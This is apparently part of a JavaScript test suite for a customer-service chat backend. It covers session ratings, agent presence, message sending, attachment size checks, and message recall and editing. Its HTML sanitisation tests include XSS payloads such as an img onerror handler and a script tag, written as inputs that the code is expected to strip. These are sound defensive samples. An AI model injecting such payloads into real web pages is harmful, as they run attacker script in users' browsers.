  const sxModeBack = await sxSetAdminMode(sxDbModeBack, sxAsAdmin, sxSid, 'blind')
  assert(sxModeBack.status === 200, '可以切回 blind')
  assert(sxDbModeBack.calls.find(c => c.op === 'update').payload.admin_id === 'admin-1',
    'admin_id 一律写成切换的人，不清空：它是「有没有人介入过」的唯一判据，而 admin_mode 每一行都有值')

  // --- §2.14 打分 --------------------------------------------------------------------------------
  // 状态码的四档要分得开：400 是这个分数本身不合法，403 是不是你的会话，409 是「现在还不能评」或
  // 「已经评过」。全都答同一个码的话，前端只能显示一句「提交失败」，而用户唯一能自己解决的那种
  // （会话还没关，先关了再评）恰好被埋在里面。
  const sxRatedRow = { ...sxWasClosed, rating: 4, rating_comment: '还行', rated_at: '2026-08-29T01:00:00.000Z' }
  const sxRateDb = (row = sxWasClosed) => recorder({
    cs_sessions: entry => entry.op === 'update' ? { data: sxRatedRow, error: null } : { data: row, error: null },
    cs_messages: { data: { id: sxMid, sender_role: 'system' }, error: null },
    cs_session_events: { data: null, error: null },
    user_profiles: { data: null, error: null }
  })

  const sxRateBad = await sxRateSession(sxRateDb(), sxAsUser, { session_id: sxSid, rating: 9 })
  assert(sxRateBad.status === 400 && /0~5/.test(sxRateBad.body.error),
    '越界的分数答 400，并把合法范围说出来')
  const sxRateNull = await sxRateSession(sxRateDb(), sxAsUser, { session_id: sxSid, rating: null })
  assert(sxRateNull.status === 400,
    '{rating: null} 也是 400——它不能被 Number() 折成 0，那会变成一条改不回来的差评')
  const sxRateNoSess = await sxRateSession(sxRateDb(), sxAsUser, { session_id: 'not-a-uuid', rating: 5 })
  assert(sxRateNoSess.status === 400, 'session_id 不是 UUID 时先 400，不去查库')

  const sxRateStranger = await sxRateSession(sxRateDb(), { userId: 'nobody', group: 'default' },
    { session_id: sxSid, rating: 5 })
  assert(sxRateStranger.status === 403, '只有会话本人能评价——客服和管理员都不能替他评')
  const sxRateAgentSelf = await sxRateSession(sxRateDb(), sxAsAgent, { session_id: sxSid, rating: 5 })
  assert(sxRateAgentSelf.status === 403, '接待客服不能给自己打分')

  const sxRateOpen = await sxRateSession(sxRateDb(sxOpen), sxAsUser, { session_id: sxSid, rating: 5 })
  assert(sxRateOpen.status === 409 && /结束后/.test(sxRateOpen.body.error),
    '会话还开着时答 409 并说明「结束后才能评」——这是用户自己能解决的那一种')
  const sxRateTwice = await sxRateSession(sxRateDb(sxRatedRow), sxAsUser, { session_id: sxSid, rating: 5 })
  assert(sxRateTwice.status === 409 && /已经评价过/.test(sxRateTwice.body.error), '评过就不能再评')

  const sxDbRate = sxRateDb()
  const sxRated = await sxRateSession(sxDbRate, sxAsUser, { session_id: sxSid, rating: 0, comment: '  太慢了  ' })
  assert(sxRated.status === 200, '关闭的会话本人可以评价')
  const sxRateUpd = sxDbRate.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
  assert(sxRateUpd.payload.rating === 0, '0 分要原样落库——它是一个明确的差评，不是「没评价」')
  assert(sxRateUpd.payload.rated_at, 'rated_at 必须写上：它是「评过没有」的唯一判据')
  // 三个条件缺一个就是一条并发重复提交的路：两次点击撞在一起时，第二次必须拿不到行。
  assert(sxRateUpd.filters.user_id === sxUid, "update 要带 eq('user_id')")
  assert(sxRateUpd.filters.status === 'closed', "update 要带 eq('status','closed')")
  assert(sxRateUpd.is && 'rated_at' in sxRateUpd.is,
    "update 要带 is('rated_at', null)：前面那个 if 只是为了给人话的错误信息，真正拦住重复提交的是这一条")
  const sxRateMsg = sxDbRate.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(sxRateMsg.payload.sender_role === 'system' && sxRateMsg.payload.visible_to_user === false,
    '评价留痕给客服看，对用户不可见——他刚填完的东西再回显一遍只像一次莫名的回声')
  assert(/0 分/.test(sxRateMsg.payload.body) && /太慢了/.test(sxRateMsg.payload.body),
    '留痕里带上分数和留言，客服才知道自己被打了几分、为什么')
  const sxRateEvt = sxDbRate.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert')
  assert(sxRateEvt.payload.kind === 'rated' && sxRateEvt.payload.detail?.rating === 0,
    '事件是 rated，detail 里带分数——§2.13 的看板按客服聚合平均分时直接读 cs_sessions.rating，这里只留审计')

  // 留言超长要截断而不是拒绝：用户写长了不是错误，而 500 是列宽以外的一个礼貌上限。
  const sxDbRateLong = sxRateDb()
  await sxRateSession(sxDbRateLong, sxAsUser, { session_id: sxSid, rating: 3, comment: 'x'.repeat(900) })
  assert(sxDbRateLong.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
    .payload.rating_comment.length === 500, '留言截到 500 字，不是答一句 400')

  // §2.3 上下线。心跳和手动开关不能混成一个动作：一次心跳把手动设为离线的客服拉回在线，
  // 于是他刚点了「离线」就又开始收会话。
  const sxDbBeat = recorder({ cs_agents: { data: { user_id: sxAid, online: true }, error: null } })
  await sxSetPresence(sxDbBeat, sxAsAgent, {})
  const sxBeat = sxDbBeat.calls.find(c => c.table === 'cs_agents')
  assert(!('online' in sxBeat.payload), '不带 online 的请求只更新心跳，不改在线状态')
  assert(sxBeat.payload.last_heartbeat, '心跳时间要更新')
  assert(sxBeat.upsertOpts?.onConflict === 'user_id',
    'upsert 要带 onConflict：cs_agents 的主键是 user_id，漏掉就是第二次上线时撞主键')

  const sxDbOff = recorder({ cs_agents: { data: { online: false }, error: null } })
  await sxSetPresence(sxDbOff, sxAsAgent, { online: false })
  assert(sxDbOff.calls[0].payload.online === false, '手动离线写 false')
  assert(!sxDbOff.calls[0].payload.last_heartbeat,
    '离线时不该更新心跳——更新了的话「他最后一次在线是什么时候」就查不出来了')

  const sxPresenceByUser = await sxSetPresence(recorder(), sxAsUser, { online: true })
  assert(sxPresenceByUser.status === 403, '普通用户不能把自己设成在线客服')
  const sxBadCap = await sxSetPresence(recorder(), sxAsAgent, { max_concurrent: -1 })
  assert(sxBadCap.status === 400, '负数上限要拒绝')
  const sxNullCap = recorder({ cs_agents: { data: {}, error: null } })
  await sxSetPresence(sxNullCap, sxAsAgent, { max_concurrent: null })
  assert(sxNullCap.calls[0].payload.max_concurrent === null,
    'null 是合法值，意思是「用全站默认」——不能被当成 0')
  const sxZeroCap = recorder({ cs_agents: { data: {}, error: null } })
  await sxSetPresence(sxZeroCap, sxAsAgent, { max_concurrent: 0 })
  assert(sxZeroCap.calls[0].payload.max_concurrent === 0,
    '0 要原样写下去，它的意思是「在线但不接新会话」')

  // --- §4 发消息 ---------------------------------------------------------------------------------
  const sxDbSend = recorder({
    cs_sessions: { data: sxOpen, error: null },
    cs_messages: { data: { id: sxMid, session_id: sxSid, sender_role: 'user', body: 'hi', auto_reply: false }, error: null },
    cs_auto_replies: { data: [], error: null },
    site_settings: sxSettings()
  })
  const sxSent = await sxSendMessage(sxDbSend, sxAsUser, { session_id: sxSid, body: 'hi' })
  assert(sxSent.status === 201, '会话所属用户可以发言')
  const sxSendIns = sxDbSend.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(sxSendIns.payload.sender_role === 'user', '用户发的消息 sender_role 是 user')
  assert(sxSendIns.payload.visible_to_user === true, '正常消息对用户可见')
  assert(sxSendIns.payload.authored_by === null, '本人发的消息没有代发者')

  const sxSendClosed = await sxSendMessage(
    recorder({ cs_sessions: { data: { ...sxOpen, status: 'closed' }, error: null }, site_settings: sxSettings() }),
    sxAsUser, { session_id: sxSid, body: 'hi' })
  assert(sxSendClosed.status === 409 && /已关闭/.test(sxSendClosed.body.error),
    '关闭的会话答 409 并说明原因——那是用户能自己解决的（重开），和没权限不同')

  // 两种介入模式下接待客服都照样能发言。这两条曾经反着写（readonly / blind 下客服发不出话），
  // §2.10 简化之后 blind 是列默认值——那两条断言活着的意思是「客服永远发不出话」。
  for (const mode of sxAdminModes) {
    const sxSendMode = await sxSendMessage(
      recorder({
        cs_sessions: { data: { ...sxOpen, admin_mode: mode }, error: null },
        cs_messages: { data: { id: sxMid, sender_role: 'agent' }, error: null },
        cs_auto_replies: { data: [], error: null },
        site_settings: sxSettings()
      }),
      sxAsAgent, { session_id: sxSid, body: 'hi' })
    assert(sxSendMode.status === 201, `${mode} 下接待客服照样能发言——介入只决定管理员署谁的名`)
  }
  const sxSendStranger = await sxSendMessage(
    recorder({ cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings() }),
    { userId: 'nobody', group: 'presale' }, { session_id: sxSid, body: 'hi' })
  assert(sxSendStranger.status === 403, '已经有客服的会话，别的客服插不进来')

  // §4.4：站点没开 HTML 时，html 格式要被拒绝，而不是降级成纯文本悄悄发出去。
  const sxSendHtmlOff = await sxSendMessage(
    recorder({ cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings() }),
    sxAsUser, { session_id: sxSid, body: '<b>x</b>', format: 'html' })
  assert(sxSendHtmlOff.status === 400, '未开启 HTML 时拒绝 html 格式')

  // 开了 HTML 也要清洗，而且清洗在写入时做。渲染时才清的话，库里留着的是可执行文本，
  // 而 Realtime 推送、导出、以后任何一个页面都拿得到它。
  const sxDbHtmlOn = recorder({
    cs_sessions: { data: sxOpen, error: null },
    cs_messages: { data: { id: sxMid, sender_role: 'user', format: 'html', auto_reply: false }, error: null },
    cs_auto_replies: { data: [], error: null },
    site_settings: sxSettings({ cs_allow_html: true })
  })
  await sxSendMessage(sxDbHtmlOn, sxAsUser, {
    session_id: sxSid, format: 'html', body: '<b>正常</b><img src=x onerror="steal()">'
  })
  const sxHtmlIns = sxDbHtmlOn.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(sxHtmlIns.payload.body.includes('<b>') && !/onerror/i.test(sxHtmlIns.payload.body),
    '落库前就清洗掉 onerror：留到渲染时清，库里那行对导出和 Realtime 仍然是可执行的')

  // --- §4.5/§4.6 附件的真实大小 -------------------------------------------------------------------
  // 文件是浏览器直传进桶的，字节数从来没经过这个函数，所以请求里的 size 是用户写的数字。
  // 上限只有一个地方能判准：问 storage 要对象的元信息。下面这几条钉的就是「问了」和「问不到时拒」。
  const sxApath = `${sxSid}/${sxUid}/ab12cd-shot.png`
  const sxAdir = `${sxSid}/${sxUid}`
  const sxAname = 'ab12cd-shot.png'
  const sxObj = (bytes, name = sxAname) => ({ name, metadata: { size: bytes } })
  const sxSendWith = (extra, size = 1) => ({
    cs_sessions: { data: sxOpen, error: null },
    cs_messages: { data: { id: sxMid, sender_role: 'user', auto_reply: false }, error: null },
    cs_auto_replies: { data: [], error: null },
    site_settings: sxSettings(),
    ...extra
  })

  const sxDbOkSize = recorder(sxSendWith({
    'storage:cs-attachments': { data: [sxObj(2 * 1024 * 1024)], error: null }
  }))
  const sxOkSize = await sxSendMessage(sxDbOkSize, sxAsUser, {
    session_id: sxSid, body: '这是截图',
    attachments: [{ path: sxApath, kind: 'image', name: 'shot.png', size: 1 }]
  })
  assert(sxOkSize.status === 201, '限额内的图片可以发出去')
  const sxLs = sxDbOkSize.storageCalls.find(c => c.op === 'list')
  assert(sxLs && sxLs.bucket === 'cs-attachments' && sxLs.dir === sxAdir && sxLs.opts?.search === sxAname,
    '按目录加 search 查单个对象，而不是把整个目录列出来——一个活跃会话的目录里可能有上百个文件')
  assert(!sxDbOkSize.storageCalls.some(c => c.op === 'sign' || c.op === 'download'),
    '只问元信息，不下载。为了一个整数把 100MB 的视频拉进函数会直接把这次调用撑爆')
  const sxSizeIns = sxDbOkSize.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(sxSizeIns.payload.attachments[0].size === 2 * 1024 * 1024,
    '落库的 size 用 storage 报的真实字节数覆盖掉请求里那个 1——否则界面上永远显示 1 B')

  const sxDbBig = recorder(sxSendWith({
    'storage:cs-attachments': { data: [sxObj(11 * 1024 * 1024)], error: null }
  }))
  const sxBig = await sxSendMessage(sxDbBig, sxAsUser, {
    session_id: sxSid, body: 'x', attachments: [{ path: sxApath, kind: 'image', size: 1 }]
  })
  assert(sxBig.status === 400 && /10 MB/.test(sxBig.body.error),
    '超限要拒，而且错误里带上限额数字——「文件太大」这句话不告诉用户该压到多少')
  const sxRm = sxDbBig.storageCalls.find(c => c.op === 'remove')
  assert(sxRm && sxRm.paths.includes(sxApath),
    '超限的对象要删掉：没有任何消息引用它，留着就是永远不会有人清的垃圾')
  assert(!sxDbBig.calls.some(c => c.table === 'cs_messages' && c.op === 'insert'), '超限时不写消息')

  // 同样 11MB 的视频要放过去。分三档配置的全部意义就在这里：图片和视频用一个数字的话，
  // 要么截图能传 100MB，要么录屏根本传不上来。
  const sxDbVid = recorder(sxSendWith({
    'storage:cs-attachments': { data: [sxObj(11 * 1024 * 1024, 'ab12cd-clip.mp4')], error: null }
  }))
  const sxVid = await sxSendMessage(sxDbVid, sxAsUser, {
    session_id: sxSid, body: 'x',
    attachments: [{ path: `${sxSid}/${sxUid}/ab12cd-clip.mp4`, kind: 'video', size: 1 }]
  })
  assert(sxVid.status === 201, '11MB 的视频在 100MB 档内，不能被图片那一档挡下')

  const sxDbMissing = recorder(sxSendWith({ 'storage:cs-attachments': { data: [], error: null } }))
  const sxMissing = await sxSendMessage(sxDbMissing, sxAsUser, {
    session_id: sxSid, body: 'x', attachments: [{ path: sxApath, kind: 'image' }]
  })
  assert(sxMissing.status === 400 && /上传/.test(sxMissing.body.error),
    '桶里没这个对象要拒。可能是直传还没完成，也可能是编出来的路径——两种都不该落库')

  // 失败要往关的方向倒。放行的话「让 storage 报一次错」本身就是绕过上限的办法。
  const sxDbStatErr = recorder(sxSendWith({
    'storage:cs-attachments': { data: null, error: { message: 'boom' } }
  }))
  const sxStatErr = await sxSendMessage(sxDbStatErr, sxAsUser, {
    session_id: sxSid, body: 'x', attachments: [{ path: sxApath, kind: 'image' }]
  })
  assert(sxStatErr.status === 400, 'storage 报错时拒绝，不是放行')
  assert(!sxDbStatErr.calls.some(c => c.table === 'cs_messages' && c.op === 'insert'),
    '校验不了大小就不写消息')

  // 没有附件的消息一次 storage 都不该问——绝大多数消息是纯文字，多一次网络往返就是多一份延迟。
  const sxDbNoAttach = recorder(sxSendWith({}))
  await sxSendMessage(sxDbNoAttach, sxAsUser, { session_id: sxSid, body: '只有文字' })
  assert(sxDbNoAttach.storageCalls.length === 0, '纯文字消息不问 storage')

  // 附件的归属在接口层也要挡一次，不能只靠 storage 策略。读策略按路径第一段判可见性，
  // 所以一条把第一段写成别人会话 id 的消息，会让这个会话的成员看到那边的附件。
  const sxForeign = await sxSendMessage(recorder(sxSendWith({})), sxAsUser, {
    session_id: sxSid, body: 'x',
    attachments: [{ path: `${sxOid}/${sxUid}/a.png`, kind: 'image' }]
  })
  assert(sxForeign.status === 400 && /当前会话/.test(sxForeign.body.error), '引用别的会话目录下的附件要拒')
  const sxNotMine = await sxSendMessage(recorder(sxSendWith({})), sxAsUser, {
    session_id: sxSid, body: 'x',
    attachments: [{ path: `${sxSid}/${sxAid}/a.png`, kind: 'image' }]
  })
  assert(sxNotMine.status === 400 && /自己上传/.test(sxNotMine.body.error), '引用别人上传的附件要拒')

  // 一个连 storage 都没有的 db（比如客户端配置缺失时构造出来的那种）也要拒，理由同上。
  const sxNoStorage = await sxVerify({ from: () => {} }, [{ path: sxApath, kind: 'image' }], sxLimits({}))
  assert(!sxNoStorage.ok, '拿不到 storage 客户端时不能放行')
  assert((await sxVerify({}, [], sxLimits({}))).ok, '没有附件时直接放过，不去碰 storage')

  // --- §11 发件箱的配置 ---------------------------------------------------------------------------
  // site_settings 只有管理员读得到（settings_admin 那条策略），所以浏览器自己读回来是空数组。
  // 输入框的三档限额、格式开关、可撤回窗口都得由接口下发，否则前端只能猜，而猜错的表现是
  // 用户传了一个必然会被拒的文件。
  assert(SX_SETTING_KEYS.includes('cs_upload_max_image_mb') &&
    SX_SETTING_KEYS.includes('cs_upload_max_file_mb') &&
    SX_SETTING_KEYS.includes('cs_upload_max_video_mb'),
    '三个上传限额要在 CS_SETTING_KEYS 里——不在里面就永远读不出来，等于配了也没用')
  const sxCfg = sxClientConfig({ cs_allow_html: true, cs_upload_max_image_mb: 4 })
  assert(sxCfg.allow_html === true && sxCfg.upload_limit_mb.image === 4, '配置项透传下去')
  assert(sxClientConfig({}).allow_bbcode === true && sxClientConfig({}).allow_html === false,
    'BBCode 默认开、HTML 默认关——和 §11 的种子值一致')
  assert(sxCfg.message_max_chars > 0 && sxCfg.max_attachments > 0 && sxCfg.mutable_window_ms > 0,
    '正文长度、附件数量、可撤回窗口都要下发：前端硬编码这三个数字就会和后端漂移')
  assert(!('cs_no_agent_text' in sxCfg) && !('cs_activity_basis' in sxCfg),
    '只下发输入框用得到的：无人在线的话术和活跃度口径是服务端的事，透出去只是多一份信息')
  const sxCfgResp = await sxComposerConfig(recorder({ site_settings: sxSettings() }))
  assert(sxCfgResp.status === 200 && sxCfgResp.body.upload_limit_mb.video === 100,
    '配置接口答 200 并带上三档限额')

  // §2.10：管理员在 normal 模式下以接待客服的身份说话，真作者记在 authored_by。
  const sxDbAdminSpeak = recorder({
    cs_sessions: { data: { ...sxOpen, admin_mode: 'normal' }, error: null },
    cs_messages: { data: { id: sxMid, sender_role: 'agent', auto_reply: false }, error: null },
    cs_auto_replies: { data: [], error: null },
    site_settings: sxSettings()
  })
  await sxSendMessage(sxDbAdminSpeak, sxAsAdmin, { session_id: sxSid, body: '我来看看' })
  const sxAdminIns = sxDbAdminSpeak.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(sxAdminIns.payload.sender_id === sxAid && sxAdminIns.payload.sender_role === 'agent',
    '以接待客服的身份发出——用户看到的对话要连贯')
  assert(sxAdminIns.payload.authored_by === 'admin-1',
    '真作者记在 authored_by：用户看不出差别，审计看得出')

  // blind 模式下客服看不见这个会话，就没有「让客服显得在说话」的必要，管理员用自己的身份发。
  const sxDbBlindSpeak = recorder({
    cs_sessions: { data: { ...sxOpen, admin_mode: 'blind' }, error: null },
    cs_messages: { data: { id: sxMid, sender_role: 'admin', auto_reply: false }, error: null },
    cs_auto_replies: { data: [], error: null },
    site_settings: sxSettings()
  })
  await sxSendMessage(sxDbBlindSpeak, sxAsAdmin, { session_id: sxSid, body: '我接管了' })
  const sxBlindIns = sxDbBlindSpeak.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(sxBlindIns.payload.sender_role === 'admin' && sxBlindIns.payload.sender_id === 'admin-1',
    'blind 模式下以管理员自己的身份发')

  // §3.1 自动回复只对用户发的消息触发。客服说了「退款」不该弹一段退款说明给用户。
  const sxDbAgentSays = recorder({
    cs_sessions: { data: sxOpen, error: null },
    cs_messages: { data: { id: sxMid, sender_role: 'agent', auto_reply: false }, error: null },
    cs_auto_replies: { data: [{ id: 'r', enabled: true, trigger: 'keyword', channel: 'both',
      keywords: ['退款'], match_mode: 'contains', body: '退款说明', priority: 0 }], error: null },
    site_settings: sxSettings()
  })
  await sxSendMessage(sxDbAgentSays, sxAsAgent, { session_id: sxSid, body: '关于退款的事' })
  assert(!sxDbAgentSays.tables.includes('cs_auto_replies'),
    '客服发言不查自动回复规则——查了就会给用户弹一段他没问的说明')

  // --- §2.11 撤回与编辑 ---------------------------------------------------------------------------
  // 原文要先进修订表，再从消息行里清掉。反过来的话中间失败就是原文彻底没了，
  // 而这条需求的全部内容就是「客服仍然看得到原文」。
  const sxMsgRow = {
    id: sxMid, session_id: sxSid, sender_id: sxUid, sender_role: 'user', body: '我说错了',
    format: 'plain', attachments: [{ path: `${sxSid}/${sxUid}/a.png`, kind: 'image' }], auto_reply: false,
    recalled: false, edit_count: 0, created_at: new Date().toISOString()
  }
  const sxDbRecall = recorder({
    cs_messages: entry => entry.op === 'update'
      ? { data: { ...sxMsgRow, recalled: true, body: '', attachments: [] }, error: null }
      : { data: sxMsgRow, error: null },
    cs_sessions: { data: sxOpen, error: null },
    cs_message_revisions: { data: { id: 1 }, error: null },
    cs_session_events: { data: null, error: null }
  })
  const sxRecall = await sxRecallMessage(sxDbRecall, sxAsUser, { message_id: sxMid })
  assert(sxRecall.status === 200, '两分钟内可以撤回')
  const sxRevIns = sxDbRecall.calls.find(c => c.table === 'cs_message_revisions' && c.op === 'insert')
  const sxMsgUpd = sxDbRecall.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
  assert(sxDbRecall.calls.indexOf(sxRevIns) < sxDbRecall.calls.indexOf(sxMsgUpd),
    '先写修订再清 body：顺序反了，中间失败就等于原文丢了')
  assert(sxRevIns.payload.body === '我说错了' && sxRevIns.payload.kind === 'recall', '原文进修订表')
  assert(sxRevIns.payload.session_id === sxSid,
    'cs_message_revisions 的 session_id 是 not null，漏了这一列整个撤回就报错')
  assert(sxRevIns.payload.attachments.length === 1,
    '附件也要搬进修订：下面那个更新把 attachments 清空了，不搬的话客服看到的「原文」少了那张图，' +
    '而用户撤回的往往正是那张图')
  assert(sxMsgUpd.payload.body === '' && sxMsgUpd.payload.recalled === true,
    'body 要真的清空——留着标记不清空的话，订阅了自己会话的用户能在 Realtime 推送里读回原文')
  assert(Array.isArray(sxMsgUpd.payload.attachments) && sxMsgUpd.payload.attachments.length === 0,
    '行上的附件要清掉')
  assert(sxMsgUpd.filters.recalled === false, '带 recalled=false 的条件，重复撤回不会写两条修订')
  assert(sxRecall.body.message.recalled_body === undefined,
    '答复给的是用户视角——原文不能顺着答复回到用户手上')

  const sxRecallOther = await sxRecallMessage(
    recorder({ cs_messages: { data: { ...sxMsgRow, sender_id: 'someone' }, error: null },
      cs_sessions: { data: sxOpen, error: null } }),
    sxAsUser, { message_id: sxMid })
  assert(sxRecallOther.status === 403, '只能撤自己发的消息')
  const sxRecallByAdmin = await sxRecallMessage(
    recorder({ cs_messages: { data: sxMsgRow, error: null }, cs_sessions: { data: sxOpen, error: null } }),
    sxAsAdmin, { message_id: sxMid })
  assert(sxRecallByAdmin.status === 403,
    '管理员也不能撤别人的消息——「管理员能撤客服的话」是另一条需求，这里没有')

  const sxRecallOld = await sxRecallMessage(
    recorder({ cs_messages: { data: { ...sxMsgRow, created_at: '2026-08-01T00:00:00.000Z' }, error: null },
      cs_sessions: { data: sxOpen, error: null } }),
    sxAsUser, { message_id: sxMid })
  assert(sxRecallOld.status === 409, '超过时限不能撤回')
  const sxRecallAuto = await sxRecallMessage(
    recorder({ cs_messages: { data: { ...sxMsgRow, auto_reply: true }, error: null },
      cs_sessions: { data: sxOpen, error: null } }),
    sxAsUser, { message_id: sxMid })
  assert(sxRecallAuto.status === 400, '自动回复不能撤回')
  const sxRecallTwice = await sxRecallMessage(
    recorder({ cs_messages: { data: { ...sxMsgRow, recalled: true, body: '' }, error: null } }),
    sxAsUser, { message_id: sxMid })
  assert(sxRecallTwice.status === 200 && sxRecallTwice.body.message.recalled === true,
    '已撤回的再撤一次当成成功——重复点击不该看到报错')

  // 编辑：旧版本进修订表，而且编辑也要过一遍清洗——否则先发一句干净的再编辑成带脚本的
  // 就绕过了 §4.4。
  const sxDbEdit = recorder({
    cs_messages: entry => entry.op === 'update'
      ? { data: { ...sxMsgRow, body: '改过了', edit_count: 1 }, error: null }
      : { data: sxMsgRow, error: null },
    cs_sessions: { data: sxOpen, error: null },
    cs_message_revisions: { data: { id: 2 }, error: null },
    cs_session_events: { data: null, error: null },
    site_settings: sxSettings()
  })
  const sxEdit = await sxEditMessage(sxDbEdit, sxAsUser, { message_id: sxMid, body: '改过了' })
  assert(sxEdit.status === 200, '两分钟内可以编辑')
  const sxEditUpd = sxDbEdit.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
  assert(sxEditUpd.filters.edit_count === 0,
    '带 edit_count 的条件：同一个人开两个标签页同时编辑，输的那次拿不到行')
  assert(sxEditUpd.payload.edit_count === 1 && sxEditUpd.payload.edited_at, 'edit_count 递增并记时间')
  const sxEditRev = sxDbEdit.calls.find(c => c.table === 'cs_message_revisions' && c.op === 'insert')
  assert(sxEditRev.payload.kind === 'edit' && sxEditRev.payload.body === '我说错了',
    '进修订表的是编辑前的版本，不是编辑后的')
  assert(sxEditRev.payload.revision === 1, 'revision 用 edit_count+1，不查一次表里的最大值')

  const sxDbEditHtml = recorder({
    cs_messages: entry => entry.op === 'update'
      ? { data: { ...sxMsgRow, format: 'html', body: '<b>x</b>', edit_count: 1 }, error: null }
      : { data: { ...sxMsgRow, format: 'html' }, error: null },
    cs_sessions: { data: sxOpen, error: null },
    cs_message_revisions: { data: { id: 3 }, error: null },
    cs_session_events: { data: null, error: null },
    site_settings: sxSettings({ cs_allow_html: true })
  })
  const sxEditHtml = await sxEditMessage(sxDbEditHtml, sxAsUser, {
    message_id: sxMid, format: 'html', body: '<b>x</b><script>evil()</script>'
  })
  assert(sxEditHtml.status === 200, '开了 HTML 的站点可以编辑成 html')
  const sxEditHtmlUpd = sxDbEditHtml.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
  assert(!/script/i.test(sxEditHtmlUpd.payload.body),
    '编辑也要清洗：不清就是一条「先发干净的、再编辑成带脚本的」绕过路径')

  // 正文和附件都空是空消息，拒绝。sxMsgRow 带一个附件，所以这一条要用不带附件的行。
  const sxEditEmpty = await sxEditMessage(
    recorder({ cs_messages: { data: { ...sxMsgRow, attachments: [] }, error: null },
      cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings() }),
    sxAsUser, { message_id: sxMid, body: '   ' })
  assert(sxEditEmpty.status === 400, '编辑成全空要拒绝：那是一次该走撤回的操作')

  // 还有附件时把正文改成空白是合法的（删掉图片的说明文字），但要归一成空串——留着 '   '
  // 在界面上是一个有高度、没内容的气泡，看起来像加载失败。
  const sxDbCaption = recorder({
    cs_messages: entry => entry.op === 'update'
      ? { data: { ...sxMsgRow, body: '', edit_count: 1 }, error: null } : { data: sxMsgRow, error: null },
    cs_sessions: { data: sxOpen, error: null },
    cs_message_revisions: { data: { id: 4 }, error: null },
    cs_session_events: { data: null, error: null },
    site_settings: sxSettings()
  })
  const sxCaption = await sxEditMessage(sxDbCaption, sxAsUser, { message_id: sxMid, body: '   ' })
  assert(sxCaption.status === 200, '有附件时可以把正文清空')
  assert(sxDbCaption.calls.find(c => c.table === 'cs_messages' && c.op === 'update').payload.body === '',
    '空白归一成空串，不是原样存下三个空格')
  const sxEditRecalled = await sxEditMessage(
    recorder({ cs_messages: { data: { ...sxMsgRow, recalled: true }, error: null } }),
    sxAsUser, { message_id: sxMid })
  assert(sxEditRecalled.status === 409, '已撤回的消息不能编辑')
  const sxEditSame = await sxEditMessage(
    recorder({ cs_messages: { data: sxMsgRow, error: null }, cs_sessions: { data: sxOpen, error: null },
      site_settings: sxSettings() }),
    sxAsUser, { message_id: sxMid, body: '我说错了' })
  assert(sxEditSame.status === 200 && !sxEditSame.body.message.edited_at,
    '内容没变就不写修订、不标 edited_at——否则客服会看到一串「编辑过」而历史里每条都一样')

  // --- 读消息与已读 ------------------------------------------------------------------------------
  // 非 staff 要在查询里就把 visible_to_user=false 的行排除掉。查回来再筛的话那些行已经进了这个
  // 进程的内存，而下一个改这段代码的人很容易把它们带进答复。
  const sxRecalledRow = { ...sxMsgRow, recalled: true, body: '', attachments: [] }
  const sxDbList = recorder({
    cs_sessions: { data: sxOpen, error: null },
    cs_messages: { data: [sxRecalledRow], error: null },
    cs_message_revisions: { data: [{ message_id: sxMid, kind: 'recall', body: '原文' }], error: null }
  })
  const sxListUser = await sxListMessages(sxDbList, sxAsUser, { session_id: sxSid })
  const sxListSel = sxDbList.calls.find(c => c.table === 'cs_messages' && c.op === 'select')
  assert(sxListSel.filters.visible_to_user === true,
    '非 staff 的查询带 visible_to_user=true，在 SQL 里过滤，不在 JS 里')
  assert(!sxDbList.tables.includes('cs_message_revisions'),
    '用户那侧根本不查修订表——查了就是把原文取进内存')
  assert(sxListUser.body.messages[0].recalled_body === undefined, '用户拿不到撤回原文')

  const sxDbListAgent = recorder({
    cs_sessions: { data: sxOpen, error: null },
    cs_messages: { data: [sxRecalledRow], error: null },
    cs_message_revisions: { data: [{ message_id: sxMid, kind: 'recall', body: '原文' }], error: null }
  })
  const sxListAgent = await sxListMessages(sxDbListAgent, sxAsAgent, { session_id: sxSid })
  const sxAgentSel = sxDbListAgent.calls.find(c => c.table === 'cs_messages' && c.op === 'select')
  assert(!('visible_to_user' in sxAgentSel.filters), '客服那侧不过滤 visible_to_user')
  assert(sxListAgent.body.messages[0].recalled_body === '原文', '客服看得到原文')

  // 没有撤回也没有编辑过的消息，不该去查一次修订表——那是一次白跑的查询，而它跑在每次拉消息上。
  const sxDbListClean = recorder({
    cs_sessions: { data: sxOpen, error: null },
    cs_messages: { data: [sxMsgRow], error: null }
  })
  await sxListMessages(sxDbListClean, sxAsAgent, { session_id: sxSid })
  assert(!sxDbListClean.tables.includes('cs_message_revisions'),
    '没有撤回/编辑过的消息时不查修订表')

  const sxListStranger = await sxListMessages(
    recorder({ cs_sessions: { data: sxOpen, error: null } }),
    { userId: 'nobody', group: 'presale' }, { session_id: sxSid })
  assert(sxListStranger.status === 403, '已有客服的会话，别的客服读不到')
  // 介入模式不影响谁读得到。这条曾经断言 blind 下接待客服读不到（「完全看不见」），
  // 而 blind 现在是列默认值——那等于说接待客服读不到任何会话。
  for (const mode of sxAdminModes) {
    const sxListMode = await sxListMessages(
      recorder({
        cs_sessions: { data: { ...sxOpen, admin_mode: mode }, error: null },
        cs_messages: { data: [], error: null }
      }),
      sxAsAgent, { session_id: sxSid })
    assert(sxListMode.status === 200, `${mode} 下接待客服照样读得到自己的会话`)
  }

  // limit 要在服务端夹住。不夹的话 ?limit=999999 是一个能把整个会话历史一次拉走的调用，
  // 而消息表是这个库里增长最快的一张。
  const sxDbCap = recorder({
    cs_sessions: { data: sxOpen, error: null }, cs_messages: { data: [], error: null }
  })
  await sxListMessages(sxDbCap, sxAsUser, { session_id: sxSid, limit: 99999 })
  const sxCapSel = sxDbCap.calls.find(c => c.table === 'cs_messages' && c.op === 'select')
